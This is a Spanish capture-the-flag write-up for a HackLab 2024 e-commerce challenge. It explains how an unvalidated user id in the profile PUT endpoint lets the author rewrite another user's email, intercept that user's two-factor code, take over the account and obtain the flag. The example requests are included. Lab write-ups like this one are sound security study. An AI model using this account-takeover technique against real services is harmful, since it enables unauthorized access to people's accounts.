# Desafío 33 - ECommerce (HackLab 2024)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2024  
**Categoría:** Auth  

## Análisis

El sistema tiene autenticación en dos pasos para el usuario Juan. La vulnerabilidad permite modificar el email de otro usuario (sin autenticación adicional) a través de un endpoint de perfil mal protegido.

## Explotación

Se hace login con María para explorar la aplicación:

```http
POST /login/ HTTP/2
Content-Type: application/json

{
  "username": "maria",
  "password": "120c7c1bba3421"
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 1](assets/01.png)

La respuesta trae un `unique_id` (distinto en cada login) y un `user_id`:

```json
{
  "success": true,
  "unique_id": "fbbd1dd9-0cca-4c91-8d2e-94015429b445",
  "user_id": 1
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 2](assets/02.png)

Probando enviar `"unique_id": null` en un segundo intento, la respuesta sigue siendo `success: true`, lo que confirma que ese campo no se valida correctamente en el backend.

![Desafío 33 - ECommerce (HackLab 2024) - imagen 3](assets/03.png)

Explorando la tienda con la sesión de María se listan los productos disponibles (`GET /productos/`):

![Desafío 33 - ECommerce (HackLab 2024) - imagen 4](assets/04.png)

Entre ellos está el producto requerido para el desafío, **Memoria RAM 16GB DDR4** (`id: 5`):

```json
{
  "nombre": "Memoria RAM 16GB DDR4",
  "descripcion": "Kit de memoria RAM DDR4 de 16GB a 3200MHz para alto rendimiento.",
  "precio": "80.00",
  "id": 5
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 5](assets/05.png)

Interceptando `GET /compras/` se obtiene el detalle de la cuenta de María, incluido su ID real de usuario (`id_usuario: 2`):

![Desafío 33 - ECommerce (HackLab 2024) - imagen 6](assets/06.png)

```json
{
  "nombre": "Monitor 27'' 4K",
  "precio": "450.00",
  "id_producto": 3,
  "id_usuario": 2,
  "username": "maria",
  "email": "maria@hacklab.com",
  "first_name": "María",
  "last_name": "Torres"
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 7](assets/07.png)

Juan tiene verificación en dos pasos y enviar un código incorrecto es rechazado:

![Desafío 33 - ECommerce (HackLab 2024) - imagen 8](assets/08.png)

```http
HTTP/2 401 Unauthorized

{
  "success": false,
  "error": "Código incorrecto."
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 9](assets/09.png)

En la cuenta de María, la pestaña de perfil muestra sus datos con un botón **Modificar** deshabilitado:

![Desafío 33 - ECommerce (HackLab 2024) - imagen 10](assets/10.png)

Interceptando de nuevo el `GET /profile/` se recupera la estructura exacta del JSON para armar la petición de modificación:

![Desafío 33 - ECommerce (HackLab 2024) - imagen 11](assets/11.png)

```json
{
  "username": "maria",
  "email": "maria@hacklab.com",
  "first_name": "María",
  "last_name": "Torres",
  "id": 2
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 12](assets/12.png)

Se prueba un **POST** a `/profile/` → `"error": "Método no permitido"`.

![Desafío 33 - ECommerce (HackLab 2024) - imagen 13](assets/13.png)

Se prueba un **PUT** con todos los campos del JSON (incluyendo `username`) → el servidor acepta el método pero rechaza el cambio de nombre de usuario.

![Desafío 33 - ECommerce (HackLab 2024) - imagen 14](assets/14.png)

```json
{
  "error": "No se puede cambiar el username."
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 15](assets/15.png)

Al **borrar el campo `username`** del PUT y modificar el email, la petición es aceptada:

```json
{
  "email": "holamundo@hacklab.com",
  "first_name": "cheto",
  "last_name": "hola",
  "id": 2
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 16](assets/16.png)

Se confirma el cambio en el perfil de María (prueba de concepto antes del ataque real):

![Desafío 33 - ECommerce (HackLab 2024) - imagen 17](assets/17.png)

Como el endpoint no valida que el `id` del PUT corresponda al usuario autenticado, se repite la petición cambiando el `id` a `1` (Juan) y el email por uno propio. El perfil de Juan queda modificado:

```json
{
  "email": "gonzaorban@gmail.com",
  "first_name": "Juan",
  "last_name": "Perez",
  "id": 1
}
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 18](assets/18.png)

Al volver a ingresar con Juan, el código de verificación en dos pasos llega al email propio recién configurado:

![Desafío 33 - ECommerce (HackLab 2024) - imagen 19](assets/19.png)

Se completa la autenticación de Juan con ese código:

![Desafío 33 - ECommerce (HackLab 2024) - imagen 20](assets/20.png)

Y se realiza la compra del producto requerido, **Memoria RAM 16GB DDR4**:

![Desafío 33 - ECommerce (HackLab 2024) - imagen 21](assets/21.png)

![Desafío 33 - ECommerce (HackLab 2024) - imagen 22](assets/22.png)

## Flag

```
fe01348e4bf437fe03688896f7889107
```

![Desafío 33 - ECommerce (HackLab 2024) - imagen 23](assets/23.png)
